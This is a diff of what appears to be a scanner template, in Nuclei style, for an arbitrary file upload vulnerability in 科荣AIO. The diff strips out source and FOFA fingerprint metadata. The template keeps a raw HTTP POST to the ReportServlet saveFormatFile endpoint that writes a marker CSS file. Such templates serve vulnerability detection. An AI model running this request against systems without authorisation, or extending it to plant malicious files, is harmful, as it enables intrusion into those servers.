@@ -3,12 +3,8 @@ info:
   name: 科荣AIO 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ayqhuq5ilvctob5t'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ayqhuq5ilvctob5t
-    fofa: '"changeAccount(''8000'')"'
 http:
 - raw:
   - 'POST /ReportServlet?operation=saveFormatFile&fileName=dudesuite.css&language= HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     dudesuite
